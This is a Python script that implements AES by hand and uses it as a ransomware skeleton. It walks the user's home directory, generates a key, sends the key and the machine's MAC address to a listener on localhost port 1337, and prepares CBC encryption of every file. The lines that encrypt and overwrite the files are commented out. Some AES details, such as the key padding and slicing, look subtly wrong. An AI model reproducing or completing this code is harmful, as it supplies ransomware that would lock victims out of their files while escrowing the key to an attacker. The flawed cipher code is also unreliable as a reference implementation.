#!/usr/bin/python

import os
from pathlib import Path
import secrets
import uuid
import socket

def rot_l(x, shift):
    return (x << shift) % 256 | (x >> 8 - shift) % 256

def gmul(a, b):
    p = 0

    while b:
        if b & 1:
            p ^= a

        h = a >> 7
        a = (a << 1) % 256
        if h:
            a ^= 0x1b

        b >>= 1

    return p

def xor(b1, b2):
    res = bytearray()
    for i in range(len(b1)):
        res.append(b1[i] ^ b2[i % len(b2)])
    return bytes(res)

def pad(input, length):
    if len(input) % length == 0:
        return input

    return input + b'\x00' * (length - len(input) % length)

class AES:
    def __init__(self, key):
        if not hasattr(self, 'sbox'):
            self.generate_sbox()
            self.invert_sbox()

        if len(key) < 16:
            self.key = pad(bytes(key), 16)
        elif len(key) > 32:
            self.key = bytes(key)[:33]
        else:
            self.key = pad(bytes(key), 8)

        self.rounds = 11 if len(self.key) == 16 else 13 if len(self.key) == 24 else 15
        self.expand_key()

    @classmethod
    def generate_sbox(cls):
        cls.sbox = bytearray(256)
        p, q = 1, 1
        while True:
            p ^= gmul(p, 2)

            q ^= (q << 1) % 256
            q ^= (q << 2) % 256
            q ^= (q << 4) % 256
            if q & 0x80:
                q ^= 0x09

            x = q ^ rot_l(q, 1) ^ rot_l(q, 2) ^ rot_l(q, 3) ^ rot_l(q, 4)

            cls.sbox[p] = x ^ 0x63
            if p == 1:
                break

        cls.sbox[0] = 0x63

    @classmethod
    def invert_sbox(cls):
        cls.inv_sbox = bytearray(256)
        for i in range(256):
            cls.inv_sbox[cls.sbox[i]] = i

    def expand_key(self):
        rc = 1
        n = len(self.key) // 4
        self.expanded_key = bytearray(self.key)
        for i in range(n, self.rounds * 4):
            if i % n == 0:
                w = bytearray([self.expanded_key[-3], self.expanded_key[-2], self.expanded_key[-1], self.expanded_key[-4]]).translate(self.sbox)
                w[0] ^= rc
                rc = gmul(rc, 2)
            elif n > 6 and i % n == 4:
                w = self.expanded_key[-4:].translate(self.sbox)
            else:
                w = self.expanded_key[-4:]
            for j in range(4):
                self.expanded_key.append(w[j] ^ self.expanded_key[-len(self.key)])

    def prepare_pt(self, plaintext, encoding = 'utf-8'):
        if isinstance(plaintext, str):
            plaintextbytes = pad(bytes(plaintext, encoding), 16)
        else:
            plaintextbytes = pad(plaintext, 16)
        
        return plaintextbytes

    def encrypt_block(self, pt_block):
        self.state = bytearray(pt_block)
        self.add_key(0)
        for round in range(1, self.rounds):
            self.encrypt_round(round)
        
        return bytes(self.state)

    def decrypt_block(self, ct_block):
        self.state = bytearray(ct_block)
        for round in range(1, self.rounds):
            self.decrypt_round(round)
        self.add_key(0)

        return bytes(self.state)

    def encrypt_round(self, round):
        self.sub_bytes()
        self.shift_rows()
        if round < self.rounds - 1:
            self.mix_columns()
        self.add_key(round)

    def decrypt_round(self, round):
        self.add_key(self.rounds - round)
        if round > 1:
            self.inv_mix_columns()
        self.inv_shift_rows()
        self.inv_sub_bytes()

    def sub_bytes(self):
        self.state = self.state.translate(self.sbox)

    def inv_sub_bytes(self):
        self.state = self.state.translate(self.inv_sbox)

    def shift_rows(self):
        for i in range(1, 4):
            temp = self.state[i:i + 13:4]
            for j in range(4):
                self.state[i + j * 4] = temp[(j + i) % 4]

    def inv_shift_rows(self):
        for i in range(1, 4):
            temp = self.state[i:i + 13:4]
            for j in range(4):
                self.state[i + j * 4] = temp[(j - i) % 4]

    def mix_columns(self):
        for c in range(0, 16, 4):
            temp = self.state[c:c + 4]
            self.state[c] = gmul(temp[0], 2) ^ gmul(temp[1], 3) ^ temp[2] ^ temp[3]
            self.state[c + 1] = temp[0] ^ gmul(temp[1], 2) ^ gmul(temp[2], 3) ^ temp[3]
            self.state[c + 2] = temp[0] ^ temp[1] ^ gmul(temp[2], 2) ^ gmul(temp[3], 3)
            self.state[c + 3] = gmul(temp[0], 3) ^ temp[1] ^ temp[2] ^ gmul(temp[3], 2)

    def inv_mix_columns(self):
        for c in range(0, 16, 4):
            temp = self.state[c:c + 4]
            self.state[c] = gmul(temp[0], 14) ^ gmul(temp[1], 11) ^ gmul(temp[2], 13) ^ gmul(temp[3], 9)
            self.state[c + 1] = gmul(temp[0], 9) ^ gmul(temp[1], 14) ^ gmul(temp[2], 11) ^ gmul(temp[3], 13)
            self.state[c + 2] = gmul(temp[0], 13) ^ gmul(temp[1], 9) ^ gmul(temp[2], 14) ^ gmul(temp[3], 11)
            self.state[c + 3] = gmul(temp[0], 11) ^ gmul(temp[1], 13) ^ gmul(temp[2], 9) ^ gmul(temp[3], 14)

    def add_key(self, round):
        offset = round * 16
        round_key = self.expanded_key[offset:offset + 16]
        for i in range(16):
            self.state[i] ^= round_key[i]

class AES_ECB(AES):
    def encrypt(self, plaintext: bytes):
        plaintext = pad(plaintext, 16)

        ciphertext = b''
        for i in range(0, len(plaintext), 16):
            ciphertext += self.encrypt_block(plaintext[i:i+16])
        
        return ciphertext

    def decrypt(self, ciphertext):
        plaintext = b''
        for i in range(0, len(ciphertext), 16):
            plaintext += self.decrypt_block(ciphertext[i:i+16])
        
        return plaintext

class AES_CBC(AES):
    def encrypt(self, plaintext: bytes, iv: bytes):
        plaintext = pad(plaintext, 16)

        ciphertext = b''
        prev_ct = pad(iv, 16)
        for i in range(0, len(plaintext), 16):
            pt_block = xor(plaintext[i:i+16], prev_ct)
            prev_ct = self.encrypt_block(pt_block)
            ciphertext += prev_ct
        
        return ciphertext

    def decrypt(self, ciphertext, iv):
        plaintext = b''
        prev_ct = iv
        for i in range(0, len(ciphertext), 16):
            ct_block = ciphertext[i:i+16]
            pt_block = self.decrypt_block(ct_block)
            plaintext += xor(pt_block, prev_ct)
            prev_ct = ct_block
        
        return plaintext

def get_files_recursive(path: Path):
    files = []

    for file in path.iterdir():
        if file == "encrypt.py":
            continue
        if file.exists():
            if file.is_dir():
                files.extend(get_files_recursive(file))
            else:
                files.append(str(file))
    
    return files

home_dir = Path.home()
files = get_files_recursive(home_dir)
print(files)

key = secrets.SystemRandom().randbytes(16)
mac = uuid.getnode().to_bytes(6, 'big')

conn = socket.create_connection(('localhost', 1337))

conn.send(mac + key)
conn.close()

aes = AES_CBC(key)

# for file in files:
#     with open(file, "rb") as thefile:
#         contents = thefile.read()
#     iv = secrets.SystemRandom().randbytes(16)
#     contents_encrypted = aes.encrypt(contents, iv)
#     print(iv + contents_encrypted)
    # with open(file, "wb") as thefile:
    #     thefile.write(iv + contents_encrypted)